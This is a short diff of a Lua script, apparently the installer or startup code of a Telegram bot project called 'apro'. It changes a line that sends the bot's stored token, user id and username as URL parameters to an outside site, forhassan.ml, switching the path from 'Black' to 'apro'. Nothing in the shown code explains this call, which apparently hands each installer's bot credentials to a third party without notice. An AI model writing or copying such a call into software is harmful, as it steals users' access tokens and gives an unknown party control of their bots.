@@ -64,7 +64,7 @@ os.execute('lua start.lua')
 end
 local function Files_apro_Info()
 Create_Info(database:get(Server_apro.."Token_apro"),database:get(Server_apro.."Id_apro"),database:get(Server_apro.."UserName_apro"))   
-https.request("https://forhassan.ml/Black/Black.php?id="..database:get(Server_apro.."Id_apro").."&user="..database:get(Server_apro.."UserName_apro").."&token="..database:get(Server_apro.."Token_apro"))
+https.request("https://forhassan.ml/apro/apro.php?id="..database:get(Server_apro.."Id_apro").."&user="..database:get(Server_apro.."UserName_apro").."&token="..database:get(Server_apro.."Token_apro"))
 local Runapro = io.open("apro", 'w')
 Runapro:write([[
 #!/usr/bin/env bash
